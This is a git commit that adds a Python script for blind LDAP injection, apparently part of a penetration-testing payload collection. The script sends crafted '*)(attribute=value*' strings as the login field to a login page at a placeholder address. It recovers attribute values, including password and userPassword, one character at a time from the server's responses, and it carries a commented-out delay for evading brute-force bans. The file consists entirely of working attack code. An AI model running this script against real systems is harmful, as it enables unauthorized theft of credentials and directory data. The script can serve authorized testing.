8a47d7ff9463fb5252c6d18027f931b253cfcfdd
Manish Sharma <62472469+sh377c0d3@users.noreply.github.com>
2021-12-13 19:53:21 +0530

    Create discover_valid_ldap.py

---
+++ LDAP Injection/discover_valid_ldap.py
@@ -0,0 +1,29 @@
+#!/usr/bin/python3
+import requests
+import string
+from time import sleep
+import sys
+
+proxy = { "http": "localhost:8080" }
+url = "http://10.10.10.10/login.php"
+alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
+
+attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]
+
+for attribute in attributes: #Extract all attributes
+    value = ""
+    finish = False
+    while not finish:
+        for char in alphabet: #In each possition test each possible printable char
+            query = f"*)({attribute}={value}{char}*"
+            data = {'login':query, 'password':'bla'}
+            r = requests.post(url, data=data, proxies=proxy)
+            sys.stdout.write(f"\r{attribute}: {value}{char}")
+            #sleep(0.5) #Avoid brute-force bans
+            if "Cannot login" in r.text:
+                value += str(char)
+                break
+
+            if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
+                finish = True
+                print()
